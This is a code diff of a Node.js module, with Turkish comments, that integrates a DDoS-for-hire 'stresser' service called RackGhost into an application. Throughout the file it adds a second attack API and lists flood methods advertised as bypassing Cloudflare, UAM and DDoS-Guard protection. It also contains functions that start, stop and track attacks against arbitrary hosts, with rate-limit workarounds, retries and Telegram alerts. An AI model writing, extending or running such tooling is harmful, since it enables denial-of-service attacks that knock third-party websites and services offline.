@@ -2,23 +2,30 @@
  * rackghost.js
  * RackGhost stresser entegrasyonu (stresse.st alternatifi provider).
  *
- * RackGhost'un public API'si yok ve Cloudflare sunucu istemcilerini
- * engelliyor; bu yuzden yerel oturum servisi (127.0.0.1:3210,
- * backend/rg_service.py) kullaniliyor. Servis CapSolver ile CF challenge'i
- * cozer, login olur ve panel/stresser_api.php cagrilarini iletir.
+ * TEK hesapta IKI stresser sistemi (ayni oturum servisi uzerinden):
+ *  - 'main' (api:2, /panel/stresser.php klasik): serbest host/port/time/
+ *    concurrents/method; maks 15 slot, 7200sn. Carpanli methodlar (HTTPSMIX
+ *    2x) tuketim uzerinden dogrulanir.
+ *  - 'new'  (api:3, /panel/assign.php "New Stresser"): atanmis profil ile
+ *    {action:'start_assigned', profile_id, params:{host,time,method,
+ *    reqmethod,rps,conn}}; maks 80 baglanti (yonetici uyarisi: 40-50 ustu
+ *    sormadan gitme), stop HEDEF adina yapilir, ongoing sunucu tarafli.
  *
- * Watchdog servis sagligini izler; oturum koptugunda Telegram'dan bildirir.
+ * Hesap geneli 1 istek/sn rate limit: iki stresser ayni paylasimli throttle
+ * kuyrugundan gecer. Watchdog oturum servisini (127.0.0.1:3210) izler.
  */
 
 const axios = require('axios');
 const { sendTelegram } = require('./telegram');
 
 const SERVICE_URL = 'http://127.0.0.1:3210';
-// Loopback servis paylasilan gizli degeri (SSRF/zincirleme kotuye kullanim onlemi)
 const SERVICE_TOKEN = process.env.LOKI_RG_LOCAL_TOKEN || '';
 const WATCHDOG_INTERVAL_MS = 5 * 60 * 1000;
+// Yeni stresser'in atanmis profil ID'si (assign sayfasindaki s-assign degeri)
+const RG_PROFILE_ID = process.env.LOKI_RG_PROFILE_ID || '7';
 
-const METHODS = [
+// ---- Klasik stresser (api:2) methodlari -----------------------------------
+const METHODS_MAIN = [
   { value: 'SOUNDV3', label: '[BETA] SOUND-V3 (HTTPS/HTTP3) [CF]', layer: 'L7' },
   { value: 'SPAMMERV3', label: '[BETA] SPAMMER v3 (HTTP/1.x HTTP/2) [CDN]', layer: 'L7' },
   { value: 'HTTPSMIX', label: '[BETA] HTTPS-MIX', layer: 'L7' },
@@ -52,7 +59,31 @@ const METHODS = [
   { value: 'UDPTCPMIX', label: 'UDP+TCP Mix', layer: 'L4' }
 ];
 
-const LIMITS = { maxTime: 7200, maxConcurrents: 15 };
+// ---- Yeni stresser (api:3, assign) methodlari ------------------------------
+// SERVIS DISI olanlar etiketle nir: upstream secmeye izin verir ama kullaniciyi uyarir.
+const METHODS_NEW = [
+  { value: 'Http-flood', label: 'Http-flood — Ücretsiz HTTP/2 Flooder', layer: 'L7' },
+  { value: 'Human', label: 'Human — Yeni UAM Bypass [PRIVATE]', layer: 'L7' },
+  { value: 'Percussed', label: '❌ PERCUSSED (SERVİS DIŞI)', layer: 'L7' },
+  { value: 'G-Flood', label: '❌ G-FLOOD (SERVİS DIŞI)', layer: 'L7' },
+  { value: 'Hitting', label: '❌ HITTING (SERVİS DIŞI)', layer: 'L7' },
+  { value: 'Cache', label: '❌ CACHE (SERVİS DIŞI)', layer: 'L7' },
+  { value: 'Secure', label: 'Secure — Çeşitli korumaları aşar', layer: 'L7' },
+  { value: 'Flooder', label: 'Flooder — Standart HTTP/2 Flooder', layer: 'L7' },
+  { value: 'Browser', label: 'Browser — Cloudflare Challenge ve DDoS-Guard aşar', layer: 'L7' },
+  { value: 'HTTP-STORM', label: 'HTTP-STORM — Özel korumalar / Cloudflare WAF', layer: 'L7' },
+  { value: 'HTTP2-FLOODER', label: 'HTTP2-FLOODER', layer: 'L7' },
+  { value: 'HTTP1-FLOODER', label: 'HTTP1-FLOODER', layer: 'L7' },
+  { value: 'HTTP-MEDUSA', label: 'HTTP-MEDUSA — Özel korumalar', layer: 'L7' },
+  { value: 'HTTP-AREX', label: 'HTTP-AREX — CF/DDoS-Guard bypass', layer: 'L7' },
+  { value: 'GET', label: 'GET', layer: 'L7' },
+  { value: 'POST', label: 'POST', layer: 'L7' }
+];
+
+const STRESSERS = {
+  main: { name: 'main', label: 'Klasik', api: 2, limits: { maxTime: 7200, maxConcurrents: 15 }, methods: METHODS_MAIN },
+  new: { name: 'new', label: 'Yeni (Profil)', api: 3, limits: { maxTime: 7200, maxConcurrents: 80 }, methods: METHODS_NEW }
+};
 
 // Bazi methodlar girilen concurrents'in kati kadar slot tuketir (or. HTTPSMIX,
 // HTTPCUSTOM 2x). Kullanicinin girdigi deger upstream'e AYNEN gonderilir;
@@ -63,7 +94,22 @@ function slotMultiplier(method) {
   return METHOD_MULTIPLIERS[String(method).toUpperCase()] || 1;
 }
 
-// Bilinen upstream hatalarini kisa Turkce mesaja cevir
+function getStresser(name) {
+  if (name && STRESSERS[name]) return STRESSERS[name];
+  return null;
+}
+
+function getStressers() {
+  return Object.values(STRESSERS).map((s) => ({
+    name: s.name, label: s.label, limits: s.limits, profileId: s.name === 'new' ? RG_PROFILE_ID : null
+  }));
+}
+
+// Gorunum/display onek: main 'rg_' (geriye uyumlu), new 'rg2_'
+function displayPrefix(stresser) {
+  return stresser === 'new' ? 'rg2_' : 'rg_';
+}
+
 function normalizeRgError(msg) {
   const m = String(msg || '');
   if (/reached the limit of available slots/i.test(m)) {
@@ -75,19 +121,10 @@ function normalizeRgError(msg) {
   return m;
 }
 
-let lastOkAt = null;
-let lastError = null;
-let serviceAlerted = false;
-let watchdogTimer = null;
+// Hesap geneli 1 istek/sn throttle (iki stresser ayni kuyruk). Slot ANINDA
+// rezerve edilir; ayni milisaniyede gelen istekler birlikte cikip kurali ihlal
+// etmesin diye zaman damgasi burada ilerletilir.
 let lastApiCallAt = 0;
-let consecutiveUnhealthy = 0;
-// Kac ardisik sagliksiz tick'te alarm verilsin (5dk/tick): restart/login
-// pencereleri (CapSolver cozumu ~30-60sn) yanlis alarm uretmesin.
-const UNHEALTHY_ALERT_THRESHOLD = 3;
-
-// RackGhost rate limit: 1 istek/sn. Slot ANINDA rezerve edilir; aksi halde
-// ayni milisaniyede gelen istekler (loop launch + canli liste + yoklama)
-// uykudan once okuyup birlikte cikar ve 1sn kuralini ihlal eder.
 async function throttle() {
   const now = Date.now();
   const at = Math.max(now, lastApiCallAt + 1100);
@@ -95,6 +132,9 @@ async function throttle() {
   const wait = at - now;
   if (wait > 0) await new Promise((r) => setTimeout(r, wait));
 }
+
+let lastOkAt = null;
+let lastError = null;
 
 async function apiCall(payload) {
   try {
@@ -108,7 +148,6 @@ async function apiCall(payload) {
     }
     lastOkAt = new Date().toISOString();
     lastError = null;
-    serviceAlerted = false;
     return data.data;
   } catch (err) {
     if (err.code === 'ECONNREFUSED') {
@@ -123,41 +162,66 @@ async function apiCall(payload) {
   }
 }
 
-/** Saldiri baslat. params: {host, port, time, concurrents, method}
- *  concurrents: kullanicinin TUKETMEK istedigi slot; carpanli methodlarda
- *  upstream'e bolunmus deger gonderilir. */
-async function startAttack(params) {
-  const method = String(params.method).toUpperCase();
-  const mult = slotMultiplier(method);
-  const wanted = parseInt(params.concurrents) || 1;
-  // Limit tuketim uzerinden: girilen deger x carpan 15'i asamaz
-  // (or. 2x methodda 8 girilirse 16 slot olurdu; baslatmadan reddet).
-  if (wanted * mult > LIMITS.maxConcurrents) {
-    throw new Error(mult > 1
-      ? `RackGhost: bu method ${mult}x slot tüketir; en fazla ${Math.floor(LIMITS.maxConcurrents / mult)} girebilirsiniz.`
-      : `RackGhost: en fazla ${LIMITS.maxConcurrents} concurrent girebilirsiniz.`);
+/**
+ * Saldiri baslat. opts.stresser: 'main' | 'new' (yoksa 'main').
+ *  main params: {host, port, time, concurrents, method}
+ *  new  params: {host, time, method, reqmethod, rps, concurrents->conn}
+ * Donus: { message, attackIds, raw, slotsTotal, account: stresserAdi }
+ */
+async function startAttack(params, opts = {}) {
+  const st = getStresser(opts.stresser) || STRESSERS.main;
+  const method = String(params.method || '');
+  const wanted = Math.max(1, parseInt(params.concurrents) || 1);
+
+  let payload;
+  if (st.name === 'new') {
+    // Yeni stresser: atanmis profil + form parametreleri. conn = concurrents.
+    if (wanted > st.limits.maxConcurrents) {
+      throw new Error(`RackGhost (Yeni): en fazla ${st.limits.maxConcurrents} bağlantı girebilirsiniz (yönetici uyarısı: 40-50 üzeri için izin alın).`);
+    }
+    payload = {
+      action: 'start_assigned',
+      api: 3,
+      profile_id: RG_PROFILE_ID,
+      params: {
+        host: params.host,
+        time: parseInt(params.time),
+        method,
+        reqmethod: String(params.reqmethod || 'GET').toUpperCase() === 'POST' ? 'POST' : 'GET',
+        rps: Math.max(1, parseInt(params.rps) || 64),
+        conn: wanted
+      }
+    };
+  } else {
+    const upper = method.toUpperCase();
+    const mult = slotMultiplier(upper);
+    if (wanted * mult > st.limits.maxConcurrents) {
+      throw new Error(mult > 1
+        ? `RackGhost (Klasik): bu method ${mult}x slot tüketir; en fazla ${Math.floor(st.limits.maxConcurrents / mult)} girebilirsiniz.`
+        : `RackGhost (Klasik): en fazla ${st.limits.maxConcurrents} concurrent girebilirsiniz.`);
+    }
+    payload = {
+      action: 'start',
+      api: 2,
+      params: {
+        host: params.host,
+        port: parseInt(params.port),
+        time: parseInt(params.time),
+        concurrents: wanted,
+        method: upper
+      }
+    };
   }
-  // Girilen deger upstream'e aynen gonderilir; tuketimi rackghost hesaplar.
-  const sendConc = wanted;
+
   // Rate limit gecici bir durumdur; turu tamamen kaybetmek yerine birkac
   // saniye icinde yeniden dene (kullanici bunu hissetmemeli).
   let data = null;
   let lastErr = null;
   for (let attempt = 1; attempt <= 4; attempt += 1) {
     try {
-      data = await apiCall({
-        action: 'start',
-        api: 2,
-        params: {
-          host: params.host,
-          port: parseInt(params.port),
-          time: parseInt(params.time),
-          concurrents: sendConc,
-          method
-        }
-      });
-      if (data && data.success) break;
-      lastErr = new Error(normalizeRgError(data?.message || data?.error || 'RackGhost saldiri baslatamadi'));
+      data = await apiCall(payload);
+      if (data && (data.success || (data.data && data.data.status === 'true'))) break;
+      lastErr = new Error(normalizeRgError(data?.message || data?.data?.message || data?.error || 'RackGhost saldiri baslatamadi'));
       data = null;
     } catch (err) {
       lastErr = new Error(normalizeRgError(err.message));
@@ -166,40 +230,80 @@ async function startAttack(params) {
     if (!isRateLimit || attempt === 4) break;
     await new Promise((r) => setTimeout(r, 2500 * attempt));
   }
-  if (!data || !data.success) {
+  if (!data) {
     throw lastErr || new Error('RackGhost saldiri baslatamadi');
   }
-  const items = Array.isArray(data.data) ? data.data : (data.data ? [data.data] : []);
-  // RackGhost her saldiriyi tek kayit + 'slots' alaniyla dondurur; ancak start
-  // yanitindaki slots gonderilen degeri, ongoing/panel tuketimi (x carpan)
-  // gosterebilir. Titreme olmamasi icin gosterim degeri her zaman
-  // max(bildirilen, gonderilen x carpan) olsun.
-  const reportedSlots = items.reduce((sum, it) => sum + (parseInt(it.slots, 10) || 1), 0);
-  const slotsTotal = Math.max(reportedSlots, sendConc * mult);
-  return { message: data.message, attackIds: items.map((it) => String(it.id)), raw: items, slotsTotal };
-}
 
-/** Saldiri durdur (id + host gerekli) */
-async function stopAttack(id, host) {
-  return apiCall({ action: 'stop', api: 2, id: String(id), host });
-}
-
-/** Aktif saldirilar (8sn paylasimli onbellek: canli liste + diger tuketiciler
- *  ayni veriyi tekrar istemesin, rate limit'e bosuna yuk binmesin) */
-let ongoingCache = { at: 0, data: null };
-
-async function getOngoing() {
-  if (ongoingCache.data && Date.now() - ongoingCache.at < 8000) {
-    return ongoingCache.data;
+  if (st.name === 'new') {
+    // Yanit: {status:'true', message, target, method, duration}. Kimlik = hedef
+    // (stop hedefe yapilir). Kayit defterinde rg2_<target> olarak gorunur.
+    const d = data.data || {};
+    const target = String(d.target || params.host);
+    const duration = parseInt(d.duration) || parseInt(params.time) || 60;
+    return {
+      message: d.message || data.message || 'başlatıldı',
+      attackIds: [target],
+      raw: [{ id: target, host: target, method: d.method || method, time: duration, slots: wanted }],
+      slotsTotal: wanted,
+      account: 'new'
+    };
   }
-  const data = await apiCall({ action: 'ongoing', api: 2 });
+
+  const items = Array.isArray(data.data) ? data.data : (data.data ? [data.data] : []);
+  const sendConc = wanted;
+  const reportedSlots = items.reduce((sum, it) => sum + (parseInt(it.slots, 10) || 1), 0);
+  const slotsTotal = Math.max(reportedSlots, sendConc * slotMultiplier(method.toUpperCase()));
+  return { message: data.message, attackIds: items.map((it) => String(it.id)), raw: items, slotsTotal, account: 'main' };
+}
+
+/**
+ * Saldiri durdur.
+ *  main: id (upstream saldiri ID) + host
+ *  new : id = HEDEF adi (assign sistemi hedefle durdurur)
+ */
+async function stopAttack(id, host, stresser) {
+  const st = getStresser(stresser);
+  return apiCall({ action: 'stop', api: st ? st.api : 2, id: String(id), host });
+}
+
+// Ongoing cache: stresser bazli 8sn (ayni veriyi tuketiciler tekrar istemesin)
+const ongoingCaches = { main: { at: 0, data: null }, new: { at: 0, data: null } };
+
+async function getOngoingFor(stresserName) {
+  const st = getStresser(stresserName) || STRESSERS.main;
+  const cache = ongoingCaches[st.name];
+  if (cache.data && Date.now() - cache.at < 8000) return cache.data;
+  const data = await apiCall({ action: 'ongoing', api: st.api });
   const list = data && Array.isArray(data.data) ? data.data : [];
-  ongoingCache = { at: Date.now(), data: list };
+  cache.at = Date.now();
+  cache.data = list;
   return list;
 }
 
-function getMethods() {
-  return METHODS;
+/** Iki stresserin aktif saldirilari birlesik; her satira .stresser etiketi.
+ *  new satirlari alan uyumu: id|test_id, host|target|ip, time|duration. */
+async function getOngoing() {
+  const results = await Promise.allSettled([getOngoingFor('main'), getOngoingFor('new')]);
+  const merged = [];
+  results.forEach((r, i) => {
+    const name = i === 0 ? 'main' : 'new';
+    if (r.status !== 'fulfilled') return; // tek stresser hataliysa digeri akar
+    r.value.forEach((row) => {
+      const norm = {
+        ...row,
+        id: row.id ?? row.test_id ?? row.target ?? row.host,
+        host: row.host ?? row.target ?? row.ip,
+        time: row.time ?? row.duration
+      };
+      merged.push({ ...norm, stresser: name });
+    });
+  });
+  return merged;
+}
+
+function getMethods(stresser) {
+  const st = getStresser(stresser);
+  return st ? st.methods : METHODS_MAIN;
 }
 
 function isConfigured() {
@@ -209,11 +313,18 @@ function isConfigured() {
 function getStatus() {
   return {
     configured: true,
+    stressers: getStressers(),
+    limits: STRESSERS.new.limits,
     lastOkAt,
-    lastError,
-    limits: LIMITS
+    lastError
   };
 }
+
+// ---- Watchdog --------------------------------------------------------------
+let serviceAlerted = false;
+let watchdogTimer = null;
+let consecutiveUnhealthy = 0;
+const UNHEALTHY_ALERT_THRESHOLD = 3;
 
 async function watchdogTick() {
   let healthy = false;
@@ -226,16 +337,13 @@ async function watchdogTick() {
   } catch (err) {
     detail = 'oturum servisi kapali';
   }
-
   if (healthy) {
     consecutiveUnhealthy = 0;
     serviceAlerted = false;
     return;
   }
-
   consecutiveUnhealthy += 1;
   lastError = detail;
-  // Esik altindaki gecici durumlar (restart, CapSolver login penceresi) sessiz gecilir
   if (consecutiveUnhealthy < UNHEALTHY_ALERT_THRESHOLD) return;
   if (!serviceAlerted) {
     serviceAlerted = true;
@@ -253,12 +361,12 @@ function initRackghost() {
     watchdogTick().catch((err) => console.warn('[rackghost] watchdog:', err.message));
   }, WATCHDOG_INTERVAL_MS);
   watchdogTick().catch(() => {});
-  console.log('[rackghost] init: yerel oturum servisi modu (127.0.0.1:3210)');
+  console.log(`[rackghost] init: 2 stresser — main(api2, maks ${STRESSERS.main.limits.maxConcurrents} slot) + new(api3, profil ${RG_PROFILE_ID}, maks ${STRESSERS.new.limits.maxConcurrents} baglanti)`);
 }
 
-// Stop/launch sonrasi 8sn'lik paylasimli cache'in bayat satir gostermesini onle.
+// Stop/launch sonrasi cache bayatligini onle.
 function invalidateOngoingCache() {
-  ongoingCache.at = 0;
+  Object.values(ongoingCaches).forEach((c) => { c.at = 0; });
 }
 
 module.exports = {
@@ -271,5 +379,8 @@ module.exports = {
   isConfigured,
   slotMultiplier,
   invalidateOngoingCache,
-  LIMITS
+  getStressers,
+  displayPrefix,
+  RG_PROFILE_ID,
+  LIMITS: { maxTime: 7200, maxConcurrents: 80 }
 };
